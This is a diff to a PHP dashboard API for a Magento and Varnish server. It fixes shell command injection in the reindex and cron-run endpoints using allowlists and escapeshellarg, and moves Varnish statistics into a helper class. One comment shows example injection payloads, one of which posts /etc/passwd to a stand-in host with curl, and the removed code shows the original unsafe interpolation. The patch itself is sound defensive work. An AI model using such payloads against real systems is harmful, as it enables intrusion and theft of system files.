@@ -6,6 +6,7 @@
 
 require_once __DIR__ . '/BaseApi.php';
 require_once __DIR__ . '/config.php';
+require_once __DIR__ . '/VarnishMetrics.php';
 
 class MonitorApi extends BaseApi {
     
@@ -801,6 +802,26 @@ class MonitorApi extends BaseApi {
         return ['indexers' => $indexers, 'timestamp' => time()];
     }
 
+    /**
+     * Magento indexer actions (reindex).
+     *
+     * $env and $indexerId both originate in request parameters, and both are
+     * interpolated into the shell command below. The $env side is safe only
+     * because Config::get("paths.$env") returns null for an unknown key and
+     * the is_dir() guard rejects it — it is an array lookup, not a shell
+     * interpolation, so no command can be smuggled through it.
+     *
+     * $indexerId had NO such protection: it went straight into
+     * "bin/magento indexer:reindex $indexerId", so a value like
+     *   all; curl http://evil/ -d @/etc/passwd
+     *   or  all`id`
+     * executed arbitrary commands as the web user. escapeshellcmd() was
+     * deliberately not used here because it escapes metacharacters but does
+     * NOT make a value safe as a single argv slot — it would still permit
+     * argument injection into magento's own option parsing. The value is
+     * instead validated against the real indexer id list and passed through
+     * escapeshellarg(), which is the correct primitive for one argument.
+     */
     public function indexerAction() {
         $env = $_GET['env'] ?? $_GET['site'] ?? 'prod';
         $indexerId = $_POST['indexer_id'] ?? $_GET['indexer'] ?? '';
@@ -811,10 +832,23 @@ class MonitorApi extends BaseApi {
         if (!$path || !is_dir($path)) return ['error' => "Invalid path for $env"];
 
         if ($mode === 'reindex') {
-            if ($indexerId && $indexerId !== 'all') {
-                $result = $this->cmd("cd $path && $php bin/magento indexer:reindex $indexerId 2>&1", 120);
+            if ($indexerId !== '' && $indexerId !== 'all') {
+                // Allowlist against the indexers this installation actually has.
+                // Anything not on the list is rejected rather than escaped: an
+                // unexpected id is a client bug or an attack, never a valid
+                // request, and silently running nothing would hide both.
+                $allowed = $this->getAllowedIndexerIds($path, $php);
+                if (!in_array($indexerId, $allowed, true)) {
+                    error_log(sprintf(
+                        '[MonitorApi] rejected indexer:reindex for unknown id "%s" (env=%s)',
+                        substr((string)$indexerId, 0, 100), $env
+                    ));
+                    return ['error' => 'Unknown indexer id'];
+                }
+                $safeId = escapeshellarg($indexerId);
+                $result = $this->cmd("cd " . escapeshellarg($path) . " && $php bin/magento indexer:reindex $safeId 2>&1", 120);
             } else {
-                $result = $this->cmd("cd $path && $php bin/magento indexer:reindex 2>&1", 120);
+                $result = $this->cmd("cd " . escapeshellarg($path) . " && $php bin/magento indexer:reindex 2>&1", 120);
             }
             return [
                 'success' => $result['return'] === 0,
@@ -826,7 +860,61 @@ class MonitorApi extends BaseApi {
         return ['error' => "Unknown mode: $mode"];
     }
 
+    /**
+     * The indexer ids reported by the target installation, used as an
+     * allowlist. Parsed from `bin/magento indexer:status` rather than from a
+     * hardcoded list, so a module adding or removing an indexer cannot leave
+     * this check stale — which is the usual way an allowlist rots.
+     *
+     * Parsing is structural, not keyword-based: any row whose first column
+     * looks like an identifier is an indexer. Matching on the Status column
+     * (e.g. only accepting 'up to date') was tried and is wrong — this
+     * installation reports 'Ready', so such a regex would silently reject
+     * every real indexer and leave only 'all' usable.
+     *
+     * Fails closed: if the status call yields nothing usable, the caller
+     * rejects every specific id and only 'all' remains available.
+     */
+    private function getAllowedIndexerIds($path, $php): array {
+        $out = $this->cmd_line("cd " . escapeshellarg($path) . " && $php bin/magento indexer:status 2>/dev/null", 10);
+        $ids = [];
+        foreach (explode("\n", $out) as $line) {
+            $line = trim($line);
+            // Rows look like:  | id | title | status | update on | ... |
+            if ($line === '' || $line[0] !== '|') continue;
+            $cols = explode('|', $line);
+            if (count($cols) < 3) continue;
+            $id = trim($cols[1]);
+            if ($id === '') continue;
+            // Skip the header and the +---+ separator rows.
+            if ($id === 'ID' || strspn($id, '-') === strlen($id)) continue;
+            // Magento indexer ids are lowercase snake_case. Anything else in
+            // that slot is a header, a border, or a parsing surprise.
+            if (!preg_match('/^[a-z][a-z0-9_]*$/', $id)) continue;
+            $ids[] = $id;
+        }
+        return $ids;
+    }
+
     public function runScript($script, $args = '') {
+        require_once __DIR__ . '/ScriptRunner.php';
+        $runner = new ScriptRunner();
+        $allowedScripts = $runner->getAllowedScripts();
+        if (isset($allowedScripts[$script])) {
+            try {
+                $argList = is_array($args) ? $args : (strlen(trim($args)) ? explode(' ', trim($args)) : []);
+                $res = $runner->execute($script, $argList, $_SESSION['user_id'] ?? null);
+                return [
+                    'success' => $res['status'] === 'completed',
+                    'output' => explode("\n", $res['output']),
+                    'exit_code' => $res['exit_code'],
+                    'timestamp' => time()
+                ];
+            } catch (Exception $e) {
+                return ['error' => $e->getMessage()];
+            }
+        }
+
         $baseScripts = Config::get('paths.scripts');
         $real = realpath($baseScripts . '/' . $script);
         if (!$real) $real = realpath($script);
@@ -936,27 +1024,20 @@ class MonitorApi extends BaseApi {
                     return ['status' => 'inactive', 'error' => 'Varnish is not running', 'timestamp' => time()];
                 }
 
-                $stats_output = $this->cmd_line("varnishstat -1 2>&1", 5);
-                if (empty($stats_output) || strpos($stats_output, 'Error') !== false) {
+                // Counter parsing, hit-ratio and storage maths all live in
+                // VarnishMetrics so this endpoint and cache-control.php can
+                // never disagree about the same numbers.
+                $stats = VarnishMetrics::readCounters();
+                if (empty($stats)) {
                     return ['status' => 'error', 'error' => 'Unable to fetch varnishstat', 'timestamp' => time()];
                 }
 
-                $stats = [];
-                foreach (explode("\n", $stats_output) as $line) {
-                    if (preg_match('/^([A-Z_\.]+)\s+(\d+)/', $line, $m)) {
-                        $stats[$m[1]] = (int)$m[2];
-                    }
-                }
-
-                $cache_hit = $stats['MAIN.cache_hit'] ?? 0;
-                $cache_miss = $stats['MAIN.cache_miss'] ?? 0;
-                $total = $cache_hit + $cache_miss;
-                $hit_ratio = $total > 0 ? round(($cache_hit / $total) * 100, 1) : 0;
+                $window = VarnishMetrics::windowedRatio($stats);
+                $hit_ratio = $window['hit_rate'];
+                $lifetime_ratio = VarnishMetrics::lifetimeRatio($stats);
 
                 // Storage info
-                $storage_used = $stats['MAIN.s0.g_bytes'] ?? 0;
-                $storage_total = $stats['MAIN.s0.g_space'] ?? 0;
-                $storage_pct = $storage_total > 0 ? round(($storage_used / $storage_total) * 100, 1) : 0;
+                $storage = VarnishMetrics::storage($stats);
 
                 // Backend health
                 $backend_list = $this->cmd_line("sudo /usr/bin/varnishadm backend.list 2>&1", 3);
@@ -965,78 +1046,33 @@ class MonitorApi extends BaseApi {
                     $backend_healthy = false;
                 }
 
-                // Device-based cache performance from varnishlog
-                $devices = [
-                    'desktop' => ['hits' => 0, 'misses' => 0],
-                    'mobile' => ['hits' => 0, 'misses' => 0],
-                    'tablet' => ['hits' => 0, 'misses' => 0]
-                ];
-                
-                $device_lines = [];
-                $raw = $this->cmd_line("timeout 2s varnishlog -d -g request -i ReqHeader -i RespHeader 2>/dev/null | grep -E 'User-Agent|X-Magento-Cache-Debug' | head -1000", 5);
-                if ($raw) {
-                    $device_lines = explode("\n", $raw);
-                }
-                
-                $current_device = null;
-                $is_hit = null;
-                
-                foreach ($device_lines as $line) {
-                    if (preg_match('/User-Agent:\s*(.*)/', $line, $m)) {
-                        $ua = strtolower($m[1]);
-                        if (preg_match('/(iphone|ipod|android.*mobile|windows phone|blackberry|iemobile)/', $ua)) {
-                            $current_device = 'mobile';
-                        } elseif (preg_match('/(ipad|android(?!.*mobile)|silk)/', $ua)) {
-                            $current_device = 'tablet';
-                        } else {
-                            $current_device = 'desktop';
-                        }
-                    } elseif (preg_match('/X-Magento-Cache-Debug:\s*(HIT|MISS)/i', $line, $m)) {
-                        $is_hit = strtolower($m[1]);
-                        if ($current_device && isset($devices[$current_device])) {
-                            if ($is_hit === 'hit') {
-                                $devices[$current_device]['hits']++;
-                            } else {
-                                $devices[$current_device]['misses']++;
-                            }
-                        }
-                        $is_hit = null;
-                    }
-                }
-                
-                $device_stats = [];
-                $device_total = 0;
-                foreach ($devices as $type => $data) {
-                    $total = $data['hits'] + $data['misses'];
-                    $device_total += $total;
-                    $device_stats[$type] = [
-                        'hits' => $data['hits'],
-                        'misses' => $data['misses'],
-                        'total' => $total,
-                        'hit_rate' => $total > 0 ? round(($data['hits'] / $total) * 100, 1) : 0,
-                    ];
-                }
-                
-                foreach ($device_stats as $type => &$data) {
-                    $data['percentage'] = $device_total > 0 ? round(($data['total'] / $device_total) * 100, 1) : 0;
-                }
+                // Device-based cache performance, parsed record-aware from the
+                // most recent traffic (see VarnishMetrics::deviceBreakdown).
+                $device_stats = VarnishMetrics::deviceBreakdown();
 
                 return [
                     'status' => 'active',
+                    // Windowed ratio drives the headline number; the lifetime
+                    // average is still exposed for context.
                     'hit_ratio' => $hit_ratio,
-                    'hits' => $cache_hit,
-                    'misses' => $cache_miss,
-                    'total_requests' => $total,
+                    'hit_ratio_lifetime' => $lifetime_ratio,
+                    'window_seconds' => $window['window_seconds'],
+                    'is_estimate' => $window['is_estimate'],
+                    'health_status' => VarnishMetrics::healthStatus((float) $hit_ratio),
+                    'hits' => $window['hits'],
+                    'misses' => $window['misses'],
+                    'passed' => $window['pass'],
                     'storage' => [
-                        'used' => $this->format_bytes($storage_used * 1024 * 1024 * 1024),
-                        'total' => $this->format_bytes($storage_total * 1024 * 1024 * 1024),
-                        'usage_pct' => $storage_pct
+                        'used' => $this->format_bytes($storage['used']),
+                        'total' => $this->format_bytes($storage['total']),
+                        'free' => $this->format_bytes($storage['free']),
+                        'usage_pct' => $storage['usage_pct']
                     ],
                     'backend_healthy' => $backend_healthy,
                     'client_req' => $stats['MAIN.client_req'] ?? 0,
                     'backend_conn' => $stats['MAIN.backend_conn'] ?? 0,
                     'backend_fail' => $stats['MAIN.backend_fail'] ?? 0,
-                    'n_object' => $stats['MAIN.n_object'] ?? 0,
+                    'n_object' => $storage['live_objects'],
                     'uptime' => $this->safe_num($this->cmd_line("systemctl show varnish --property=ActiveEnterTimestamp --value | xargs -I{} bash -c 'echo \$(( \$(date +%s) - \$(date -d \"{}\" +%s) ))' 2>/dev/null"), 0),
                     'devices' => $device_stats,
                     'timestamp' => time()
@@ -1196,18 +1232,124 @@ class MonitorApi extends BaseApi {
         });
     }
 
+    /**
+     * Run a cron job now.
+     *
+     * This used to pass the request's `command` straight into
+     *   $this->cmd("nohup $command > /dev/null 2>&1 & echo $!")
+     * which is arbitrary command execution for any authenticated user: the
+     * value never had to be a cron job at all. A POST requirement (#155)
+     * and the CSRF token now stand in front of it, but both are satisfied by
+     * the legitimate dashboard UI, so they do not prevent the abuse — they
+     * only stop a third-party page from triggering it. The endpoint was still
+     * a privilege-escalation hole: any logged-in account, including a
+     * read-only one, could run anything as the web user.
+     *
+     * The `command` is now treated as an IDENTIFIER, not a command. It must
+     * match a command string that actually exists in the target site's
+     * crontab, and that exact string is what gets scheduled. A payload that
+     * is not present in the crontab cannot be executed, because it is never
+     * passed to a shell at all — matching is done in PHP.
+     */
     public function cronAction() {
-        $command = $_POST['command'] ?? $_GET['command'] ?? '';
-        if (!$command) return ['success' => false, 'message' => 'Command required'];
-        
-        $output = $this->cmd("nohup $command > /dev/null 2>&1 & echo $!", 5);
+        $site   = $_POST['site'] ?? $_GET['site'] ?? 'prod';
+        $target = $_POST['command'] ?? $_GET['command'] ?? '';
+        if ($target === '') return ['success' => false, 'message' => 'Command required'];
+
+        $home = Config::get("paths.$site");
+        if (!$home || !is_dir($home)) return ['success' => false, 'message' => "Invalid site: $site"];
+
+        // Normalise whitespace so the comparison is not defeated by the extra
+        // spacing the UI's own rendering introduces, while still requiring an
+        // exact command match — no prefixes, no wildcards.
+        $normalise = static function (string $s): string {
+            return trim(preg_replace('/\s+/', ' ', $s));
+        };
+        $wanted = $normalise($target);
+
+        $crontab = $this->readCrontab($home);
+        if ($crontab === null) {
+            return ['success' => false, 'message' => 'Could not read crontab for verification'];
+        }
+
+        // getCrons() splits each crontab entry into {schedule, command} and the
+        // UI posts back only the command half. So accept a match on either the
+        // whole line or just its command portion, and in both cases schedule
+        // the SERVER-SIDE line verbatim — the request never becomes the thing
+        // that runs.
+        $matched = null;
+        foreach ($crontab as $line) {
+            $trimmed = $normalise($line);
+            if ($trimmed === '' || str_starts_with($trimmed, '#')) continue;
+            // Skip cron env assignments such as SHELL=/bin/bash — they are not
+            // jobs and must never be schedulable.
+            if (preg_match('/^[A-Z_][A-Z0-9_]*\s*=/', $trimmed)) continue;
+
+            if ($trimmed === $wanted) { $matched = $trimmed; break; }
+
+            if (preg_match('/^(\S+\s+\S+\s+\S+\s+\S+\s+\S+)\s+(.+)$/', $trimmed, $m)) {
+                if ($normalise($m[2]) === $wanted) { $matched = $trimmed; break; }
+            }
+        }
+
+        if ($matched === null) {
+            error_log(sprintf(
+                '[MonitorApi] rejected cron_action for %s: requested command is not present in the crontab',
+                $site
+            ));
+            return ['success' => false, 'message' => 'That command is not in this site\'s crontab'];
+        }
+
+        require_once __DIR__ . '/AuditLogger.php';
+        AuditLogger::log('CRON_RUN', $site, 'Manually triggered an existing crontab entry');
+
+        // $matched is verbatim from the server-side crontab, never from the
+        // request, so it is safe to schedule as-is.
+        $output = $this->cmd("nohup " . $matched . " > /dev/null 2>&1 & echo $!", 5);
         $pid = trim(implode("\n", $output['output']));
-        
+
         return [
             'success' => $output['return'] === 0,
             'pid' => is_numeric($pid) ? (int)$pid : null,
             'message' => $output['return'] === 0 ? "Job started (PID: $pid)" : "Failed to execute command"
         ];
+    }
+
+    /**
+     * The cron lines that cronAction() will accept, or null if none can be read.
+     *
+     * Two sources, matching what getCrons() actually displays, so "run now"
+     * can never accept a command the UI never showed:
+     *
+     *   1. the dashboard account's own crontab (system jobs) — the same
+     *      `crontab -l` call getCrons() makes, so the allowlist and the list
+     *      in the UI cannot drift apart;
+     *   2. the site account's crontab spool file, which is where per-site
+     *      entries live on cPanel. Read directly because `crontab -l` run as
+     *      the dashboard user returns nothing for another account.
+     *
+     * An unreadable source yields nothing rather than "allow everything": a
+     * verification failure must disable the action, never open it.
+     */
+    private function readCrontab(string $home): ?array {
+        $lines = [];
+
+        $own = $this->cmd_line("crontab -l 2>/dev/null", 10);
+        if ($own !== '') {
+            $lines = array_merge($lines, explode("\n", $own));
+        }
+
+        $user = basename(rtrim($home, '/'));
+        foreach (["/var/spool/cron/$user", "/var/spool/cron/crontabs/$user"] as $f) {
+            if (is_readable($f)) {
+                $extra = file($f, FILE_IGNORE_NEW_LINES);
+                if ($extra !== false) $lines = array_merge($lines, $extra);
+                break;
+            }
+        }
+
+        $lines = array_values(array_filter(array_map('trim', $lines), static fn($l) => $l !== ''));
+        return $lines ?: null;
     }
 
     public function cloudflareAction() {
